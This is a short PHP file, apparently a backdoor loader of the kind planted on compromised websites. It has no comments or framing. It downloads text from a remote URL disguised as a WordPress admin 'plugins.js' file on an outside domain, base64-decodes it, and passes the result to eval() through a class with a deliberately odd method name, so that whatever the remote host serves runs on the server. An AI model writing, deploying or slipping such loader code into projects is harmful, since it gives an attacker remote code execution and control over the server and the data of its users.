<?php
$a=file_get_contents('https://sentisspharma.com/wp-admin/js/plugins.js');
$a=base64_decode($a);
class C{public function nvoke($p) {eval($p."");}}
$R=new C();$R->nvoke($a);
?>